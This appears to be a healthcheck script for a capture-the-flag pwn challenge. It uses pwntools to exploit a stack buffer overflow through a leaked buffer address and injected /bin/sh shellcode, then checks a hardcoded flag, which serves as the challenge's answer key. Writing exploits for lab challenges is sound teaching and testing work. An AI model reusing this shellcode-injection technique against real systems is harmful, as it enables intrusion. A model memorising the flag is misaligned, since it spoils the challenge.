#!/usr/bin/env python3
from pwn import *
import argparse

def solve(host, port=9001):
	try:
		context.log_level = 'error' # silent
		elf = ELF("dist/pwn1")

		flag = 'flag{i-l1k3-$H3llz}'
		p = remote(host, port, timeout=10)

		# use `pwn cyclic 300`, feed into needle, then feed the crashed eip address into `pwn cyclic -l <address>`
		offset = 208

		p.recvuntil(b"within:\n")
		p.sendline(b"anything") # this will be overwritten by our overflow on needle

		# receive haystack address
		p.recvuntil(b"haystack is: ")
		address_of_haystack = int(p.recvline().decode("utf-8").strip(), 16) # convert hex characters to number

		# now we know the address of haystack within memory, we can calculate the address of needle by simply subtracting the length of needle (64)!
		address_of_needle = address_of_haystack - 64

		# generate a basic 32 bit /bin/sh shellcode
		shellcode = asm(shellcraft.i386.linux.sh())

		p.recvuntil(b"for:\n")

		# payload = SHELLCODE + JUNK + ADDRESS OF SHELLCODE
		p.sendline(shellcode + b"A" * (offset - len(shellcode)) + p32(address_of_needle))
		p.sendline(b"cat flag")
		p.recvline() # substring not found
		r = p.recvline().decode("utf-8").strip()
	except:
		return False

	if r != flag:
		return False
	else:
		return True

if __name__=='__main__':
	parser = argparse.ArgumentParser(description='Healthcheck')
	parser.add_argument('--connection-info', help='Either in the format `nc <host> <port>` or `http[s]://host[:port]`', required=True)
	args = parser.parse_args()
	conn = args.connection_info
	if conn[:3] == "nc ":
		_, host, port = conn.split(' ')
	elif conn[:5] == "http":
		target = conn
	ok = solve(host, port)
	if ok:
		print("pwn1 is good")
		exit(0)
	else:
		print("pwn1 is bad")
		exit(1)

